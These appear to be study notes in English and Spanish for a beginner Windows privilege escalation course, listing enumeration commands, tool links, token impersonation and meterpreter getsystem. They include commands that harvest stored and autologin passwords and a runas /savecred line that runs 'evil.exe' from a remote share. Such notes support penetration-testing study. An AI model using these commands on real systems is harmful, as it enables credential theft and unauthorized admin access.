# Windows Privilege Escalation for Beginners

## Initial Enumeration

### System Enumeration

```cmd
systeminfo
systeminfo | findstr /B /C:"OS Name" /C:"OS Version" /C:"System Type"
hostname
wmic qfe
wmic qfe get Caption,Descrption,HotFixID,InstalledON
wmic logicaldisk get Caption,Descrption,ProviderName
```

### User Enumeration

```cmd
whoami
whoami /priv
whoami /groups
whoami /all
net user
net user <user>
net localgroup
net localgroup <group>
```

### Network Enumeration

```cmd
ipconfig
ipconfig /all
arp -a
route print
netstat -ano
```

### Password Hunting

```cmd
findstr /si <patron> *.txt *.ini *.config
```

**Verificar guías dadas (PayloadsAllTheThings)**

### AV and Firewall Enumeration

```cmd
sc query windefend
sc queryex type=service
netsh advfirewall firewall dump
netsh firewall show state
netsh firewall show config
```

## Exploring Automated Tools

| Ejecutables | PowerShell | Otras |
|---|---|---|
| [winPEAS.exe](https://github.com/carlospolop/privilege-escalation-awesome-scripts-suite/tree/master/winPEAS) | [Sherlock.ps1](https://github.com/rasta-mouse/Sherlock) | [windows-exploit-suggester.py (local)](https://github.com/AonCyberLabs/Windows-Exploit-Suggester) |
| [Seatbelt.exe (compilar)](https://github.com/GhostPack/Seatbelt) | [PowerUp.ps1](https://github.com/PowerShellMafia/PowerSploit/tree/master/Privesc) | [Exploit Suggester (Metasploit)](https://www.rapid7.com/blog/post/2015/08/11/metasploit-local-exploit-suggester-do-less-get-more/) |
| [Watson.exe (compilar)](https://github.com/rasta-mouse/Watson) | [jaws-enum.ps1](https://github.com/411Hall/JAWS) |  |
| [SharpUp.exe (compilar)](https://github.com/GhostPack/SharpUp) |  |  |

## Escalation Paths

### Kernel Exploits

[Github - Windows Kernel Exploits](https://github.com/SecWiki/windows-kernel-exploits)

### Passwords

**Verificar guías dadas**

### Windows Subsystem for Linux

**Verificar guías dadas**

### Token Impersonation

#### What are tokens?

Llaves temporales que permiten el acceso a un sistema/red sin tener que proveer las credenciales cada que se tiene acceso a un archivo. *Como las cookies para las computadoras*.

Existen dos tipos:
- Delegate - Creado para loguearse a una máquina o hacer uso del escritorio remoto.
- Impersonate - "no-interactive" tal como el montaje de una unidad de almacenamiento en red o un script de logueo de dominio.

#### Identificación

`whoami /priv`

![5baf6ec9bbb1605fd21ebafceaa622bd.png](./images/impersonation_1.png)

Permisos: `SeAssignPrimaryToken` y `SeImpersonatePrivilege`

### getsystem

Dentro de una sesión de meterpreter ejecutar `getsystem` el cuál hace uso de de diferentes métodos para escalar los privilegios.

Se encuentra [aquí un artículo](https://www.cobaltstrike.com/blog/what-happens-when-i-type-getsystem/) para ver detalles.

### RunAs

Ejecutar `cmdkey /list` para verificar la existencia de credenciales guardadas.

```bash
cmdkey /list
Currently stored credentials:
 Target: Domain:interactive=WORKGROUP\Administrator
 Type: Domain Password
 User: WORKGROUP\Administrator
```

Posteriormente usar `runas` con la opción `savecred` para usar las credenciales guardadas. Ejemplo:

```bash
runas /savecred /user:WORKGROUP\Administrator "\\10.XXX.XXX.XXX\SHARE\evil.exe"
runas /savecred /user:Administrator "cmd.exe /k whoami"
```

*[Más info en PayloadAllTheThings](https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Methodology%20and%20Resources/Windows%20-%20Privilege%20Escalation.md#eop---runas)*


### Windows Autologin

```powershell
reg query "HKLM\SOFTWARE\Microsoft\Windows NT\Currentversion\Winlogon" # Windows Autologin
reg query "HKLM\SOFTWARE\Microsoft\Windows NT\Currentversion\Winlogon" | findstr "DefaultUserName DefaultDomainName DefaultPassword"
reg query "HKLM\SOFTWARE\Microsoft\Windows NT\Currentversion\Winlogon" 2>nul | findstr "DefaultUserName DefaultDomainName DefaultPassword"
``` 

## Recursos y referencias

- [Fuzzy Security Guide](https://www.fuzzysecurity.com/tutorials/16.html).
- [PayloadsAllTheThings Guide](https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Methodology%20and%20Resources/Windows%20-%20Privilege%20Escalation.md).
- [Absolomb's Guide](https://www.absolomb.com/2018-01-26-Windows-Privilege-Escalation-Guide/).
- [Sushant747's Guide](https://sushant747.gitbooks.io/total-oscp-guide/content/privilege_escalation_windows.html).
- [TCM Windows Priv Esc Course Repo](https://github.com/TCM-Course-Resources/Windows-Privilege-Escalation-Resources).
- [Offensive Security - Fun with Incognito](https://www.offensive-security.com/metasploit-unleashed/fun-incognito/).
- [Rotten Potato – Privilege Escalation from Service Accounts to SYSTEM](https://foxglovesecurity.com/2016/09/26/rotten-potato-privilege-escalation-from-service-accounts-to-system/).
- [CobaltStrike - What happens when I type getsystem?](https://www.cobaltstrike.com/blog/what-happens-when-i-type-getsystem/).

